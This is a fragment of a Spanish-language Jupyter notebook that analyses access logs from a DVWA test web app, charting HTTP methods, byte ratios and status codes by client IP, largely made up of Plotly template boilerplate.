            ],
            [
             0.3,
             "#f1b6da"
            ],
            [
             0.4,
             "#fde0ef"
            ],
            [
             0.5,
             "#f7f7f7"
            ],
            [
             0.6,
             "#e6f5d0"
            ],
            [
             0.7,
             "#b8e186"
            ],
            [
             0.8,
             "#7fbc41"
            ],
            [
             0.9,
             "#4d9221"
            ],
            [
             1,
             "#276419"
            ]
           ],
           "sequential": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ],
           "sequentialminus": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ]
          },
          "colorway": [
           "#636efa",
           "#EF553B",
           "#00cc96",
           "#ab63fa",
           "#FFA15A",
           "#19d3f3",
           "#FF6692",
           "#B6E880",
           "#FF97FF",
           "#FECB52"
          ],
          "font": {
           "color": "#2a3f5f"
          },
          "geo": {
           "bgcolor": "white",
           "lakecolor": "white",
           "landcolor": "#E5ECF6",
           "showlakes": true,
           "showland": true,
           "subunitcolor": "white"
          },
          "hoverlabel": {
           "align": "left"
          },
          "hovermode": "closest",
          "mapbox": {
           "style": "light"
          },
          "paper_bgcolor": "white",
          "plot_bgcolor": "#E5ECF6",
          "polar": {
           "angularaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "radialaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "scene": {
           "xaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "yaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "zaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           }
          },
          "shapedefaults": {
           "line": {
            "color": "#2a3f5f"
           }
          },
          "ternary": {
           "aaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "baxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "caxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "title": {
           "x": 0.05
          },
          "xaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          },
          "yaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          }
         }
        },
        "title": {
         "text": "Distribución de los métodos"
        },
        "xaxis": {
         "anchor": "y",
         "domain": [
          0,
          1
         ],
         "title": {
          "text": "Method"
         }
        },
        "yaxis": {
         "anchor": "x",
         "domain": [
          0,
          1
         ],
         "title": {
          "text": "count"
         }
        }
       }
      }
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "fig = px.bar(metodos, x='Method', y='count', color='Client IP', title='Distribución de los métodos')\n",
    "\n",
    "# Mostrar el gráfico\n",
    "fig.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "El segundo IP hace muchos más post que get, a analizar"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Ratio de bytes enviados y recibidos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Total bytes sent: 6201243\n",
      "Total bytes received: 5271335\n",
      "Ratio (sent/received): 1.1764084430224981\n"
     ]
    }
   ],
   "source": [
    "# Calcular el  para cada método HTTP\n",
    "bytes_sent = 0\n",
    "bytes_received = 0\n",
    "\n",
    "for i, row in df.iterrows():\n",
    "    method = row['Method']\n",
    "    bytes_str = row['Bytes Sent']\n",
    "    bytes = int(bytes_str)  # Convierte la cadena a un número entero\n",
    "\n",
    "    \n",
    "    if method in ['GET', 'HEAD', 'NETSPARKER']:\n",
    "        bytes_sent += bytes\n",
    "    else:\n",
    "        bytes_received += bytes\n",
    "\n",
    "print(\"Total bytes sent:\", bytes_sent)\n",
    "print(\"Total bytes received:\", bytes_received)\n",
    "print(\"Ratio (sent/received):\", bytes_sent / bytes_received)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "IP: 192.168.4.164\n",
      "Total bytes sent: 3836338\n",
      "Total bytes received: 395820\n",
      "Ratio (sent/received): 9.692127734828963\n",
      "\n",
      "IP: 192.168.4.25\n",
      "Total bytes sent: 2364905\n",
      "Total bytes received: 4875515\n",
      "Ratio (sent/received): 0.48505747597946064\n",
      "\n"
     ]
    }
   ],
   "source": [
    "bytes_sent_by_ip = {}\n",
    "bytes_received_by_ip = {}\n",
    "\n",
    "for i, row in df.iterrows():\n",
    "    method = row['Method']\n",
    "    bytes_str = row['Bytes Sent']\n",
    "    client_ip = row['Client IP']\n",
    "\n",
    "    bytes = int(bytes_str) if pd.notna(bytes_str) else 0\n",
    "\n",
    "    # Si la IP del cliente no está en el diccionario, inicializa sus bytes enviados y recibidos en 0\n",
    "    if client_ip not in bytes_sent_by_ip:\n",
    "        bytes_sent_by_ip[client_ip] = 0\n",
    "    if client_ip not in bytes_received_by_ip:\n",
    "        bytes_received_by_ip[client_ip] = 0\n",
    "\n",
    "    # Actualiza los bytes enviados según el método HTTP\n",
    "    if method in ['GET', 'HEAD', 'NETSPARKER']:\n",
    "        bytes_sent_by_ip[client_ip] += bytes\n",
    "    else:\n",
    "        bytes_received_by_ip[client_ip] += bytes\n",
    "\n",
    "# Imprime los resultados\n",
    "for ip in bytes_sent_by_ip.keys():\n",
    "    total_bytes_sent = bytes_sent_by_ip[ip]\n",
    "    total_bytes_received = bytes_received_by_ip[ip]\n",
    "    print(\"IP:\", ip)\n",
    "    print(\"Total bytes sent:\", total_bytes_sent)\n",
    "    print(\"Total bytes received:\", total_bytes_received)\n",
    "    if total_bytes_received != 0:\n",
    "        print(\"Ratio (sent/received):\", total_bytes_sent / total_bytes_received)\n",
    "    else:\n",
    "        print(\"Ratio (sent/received): Undefined (no bytes received)\")\n",
    "    print()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Peticiones % que llegan bien"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [],
   "source": [
    "peticiones = df[df['Method'].isin(['GET', 'HEAD', 'NETSPARKER'])]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>index</th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Ident</th>\n",
       "      <th>Auth</th>\n",
       "      <th>Timestamp</th>\n",
       "      <th>Method</th>\n",
       "      <th>Request</th>\n",
       "      <th>HTTP Version</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>Bytes Sent</th>\n",
       "      <th>...</th>\n",
       "      <th>User Agent</th>\n",
       "      <th>Client IP_encoded</th>\n",
       "      <th>Referrer_encoded</th>\n",
       "      <th>Method_encoded</th>\n",
       "      <th>Timestamp:</th>\n",
       "      <th>Hora</th>\n",
       "      <th>Dia</th>\n",
       "      <th>Latencia</th>\n",
       "      <th>Peticiones</th>\n",
       "      <th>Envios</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:05 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>2020</td>\n",
       "      <td>...</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>2023-12-22 15:19:05+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>263</td>\n",
       "      <td>...</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.git/config</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>4</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/all-wcprops</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>6</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/wc.db</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 21 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "   index      Client IP Ident Auth                   Timestamp Method  \\\n",
       "0      0  192.168.4.164     -    -  22/Dec/2023:15:19:05 +0300    GET   \n",
       "1      1  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "2      2  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "3      4  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "4      6  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "\n",
       "                  Request HTTP Version  Status Code  Bytes Sent  ...  \\\n",
       "0                  /DVWA/     HTTP/1.1          200        2020  ...   \n",
       "1                  /DVWA/     HTTP/1.1          200         263  ...   \n",
       "2       /DVWA/.git/config     HTTP/1.1          404         139  ...   \n",
       "3  /DVWA/.svn/all-wcprops     HTTP/1.1          404         139  ...   \n",
       "4        /DVWA/.svn/wc.db     HTTP/1.1          404         139  ...   \n",
       "\n",
       "                                          User Agent Client IP_encoded  \\\n",
       "0  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                 0   \n",
       "1  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                 0   \n",
       "2  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                 0   \n",
       "3  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                 0   \n",
       "4  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                 0   \n",
       "\n",
       "   Referrer_encoded  Method_encoded                Timestamp: Hora  Dia  \\\n",
       "0                 0               0 2023-12-22 15:19:05+03:00   15   22   \n",
       "1                 0               1 2023-12-22 15:19:06+03:00   15   22   \n",
       "2                 0               1 2023-12-22 15:19:06+03:00   15   22   \n",
       "3                 0               1 2023-12-22 15:19:06+03:00   15   22   \n",
       "4                 0               1 2023-12-22 15:19:06+03:00   15   22   \n",
       "\n",
       "   Latencia  Peticiones  Envios  \n",
       "0       0.0           1       0  \n",
       "1       0.0           1       0  \n",
       "2       0.0           1       0  \n",
       "3       0.0           1       0  \n",
       "4       0.0           1       0  \n",
       "\n",
       "[5 rows x 21 columns]"
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "peticiones.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Status Code</th>\n",
       "      <th>count</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>200</td>\n",
       "      <td>3127</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>404</td>\n",
       "      <td>2668</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>500</td>\n",
       "      <td>158</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>302</td>\n",
       "      <td>50</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>301</td>\n",
       "      <td>17</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>400</td>\n",
       "      <td>11</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>403</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   Status Code  count\n",
       "0          200   3127\n",
       "1          404   2668\n",
       "2          500    158\n",
       "3          302     50\n",
       "4          301     17\n",
       "5          400     11\n",
       "6          403      1"
      ]
     },
     "execution_count": 61,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "peticiones_status = peticiones['Status Code'].value_counts().reset_index()\n",
    "peticiones_status"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.plotly.v1+json": {
       "config": {
        "plotlyServerURL": "https://plot.ly"
       },
       "data": [
        {
         "alignmentgroup": "True",
         "hovertemplate": "Status Code=%{x}<br>count=%{y}<br>text=%{text}<extra></extra>",
         "legendgroup": "",
         "marker": {
          "color": "#636efa",
          "pattern": {
           "shape": ""
          }
         },
         "name": "",
         "offsetgroup": "",
         "orientation": "v",
         "showlegend": false,
         "text": [
          "51.84%",
          "44.23%",
          "2.62%",
          "0.83%",
          "0.28%",
          "0.18%",
          "0.02%"
         ],
         "textposition": "auto",
         "type": "bar",
         "x": [
          200,
          404,
          500,
          302,
          301,
          400,
          403
         ],
         "xaxis": "x",
         "y": [
          3127,
          2668,
          158,
          50,
          17,
          11,
          1
         ],
         "yaxis": "y"
        }
       ],
       "layout": {
        "barmode": "relative",
        "legend": {
         "tracegroupgap": 0
        },
        "template": {
         "data": {
          "bar": [
           {
            "error_x": {
             "color": "#2a3f5f"
            },
            "error_y": {
             "color": "#2a3f5f"
            },
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "bar"
           }
          ],
          "barpolar": [
           {
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "barpolar"
           }
          ],
          "carpet": [
           {
            "aaxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "baxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "type": "carpet"
           }
          ],
          "choropleth": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "choropleth"
           }
          ],
          "contour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "contour"
           }
          ],
          "contourcarpet": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "contourcarpet"
           }
          ],
          "heatmap": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmap"
           }
          ],
          "heatmapgl": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmapgl"
           }
          ],
          "histogram": [
           {
            "marker": {
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "histogram"
           }
          ],
          "histogram2d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2d"
           }
          ],
          "histogram2dcontour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2dcontour"
           }
          ],
          "mesh3d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "mesh3d"
           }
          ],
          "parcoords": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "parcoords"
           }
          ],
          "pie": [
           {
            "automargin": true,
            "type": "pie"
           }
          ],
          "scatter": [
           {
            "fillpattern": {
             "fillmode": "overlay",
             "size": 10,
             "solidity": 0.2
            },
            "type": "scatter"
           }
          ],
          "scatter3d": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatter3d"
           }
          ],
          "scattercarpet": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattercarpet"
           }
          ],
          "scattergeo": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergeo"
           }
          ],
          "scattergl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergl"
           }
          ],
          "scattermapbox": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattermapbox"
           }
          ],
          "scatterpolar": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolar"
           }
          ],
          "scatterpolargl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolargl"
           }
          ],
          "scatterternary": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterternary"
           }
          ],
          "surface": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "surface"
           }
          ],
          "table": [
           {
            "cells": {
             "fill": {
              "color": "#EBF0F8"
             },
             "line": {
              "color": "white"
             }
            },
            "header": {
             "fill": {
              "color": "#C8D4E3"
             },
             "line": {
              "color": "white"
             }
            },
            "type": "table"
           }
          ]
         },
         "layout": {
          "annotationdefaults": {
           "arrowcolor": "#2a3f5f",
           "arrowhead": 0,
           "arrowwidth": 1
          },
          "autotypenumbers": "strict",
          "coloraxis": {
           "colorbar": {
            "outlinewidth": 0,
            "ticks": ""
           }
          },
          "colorscale": {
           "diverging": [
            [
             0,
             "#8e0152"
            ],
            [
             0.1,
             "#c51b7d"
            ],
            [
             0.2,
             "#de77ae"
            ],
            [
             0.3,
             "#f1b6da"
            ],
            [
             0.4,
             "#fde0ef"
            ],
            [
             0.5,
             "#f7f7f7"
            ],
            [
             0.6,
             "#e6f5d0"
            ],
            [
             0.7,
             "#b8e186"
            ],
            [
             0.8,
             "#7fbc41"
            ],
            [
             0.9,
             "#4d9221"
            ],
            [
             1,
             "#276419"
            ]
           ],
           "sequential": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ],
           "sequentialminus": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ]
          },
          "colorway": [
           "#636efa",
           "#EF553B",
           "#00cc96",
           "#ab63fa",
           "#FFA15A",
           "#19d3f3",
           "#FF6692",
           "#B6E880",
           "#FF97FF",
           "#FECB52"
          ],
          "font": {
           "color": "#2a3f5f"
          },
          "geo": {
           "bgcolor": "white",
           "lakecolor": "white",
           "landcolor": "#E5ECF6",
           "showlakes": true,
           "showland": true,
           "subunitcolor": "white"
          },
          "hoverlabel": {
           "align": "left"
          },
          "hovermode": "closest",
          "mapbox": {
           "style": "light"
          },
          "paper_bgcolor": "white",
          "plot_bgcolor": "#E5ECF6",
          "polar": {
           "angularaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "radialaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "scene": {
           "xaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "yaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "zaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           }
          },
          "shapedefaults": {
           "line": {
            "color": "#2a3f5f"
           }
          },
          "ternary": {
           "aaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "baxis": {
            "gridcolor": "white",
            "linecolor": "white",
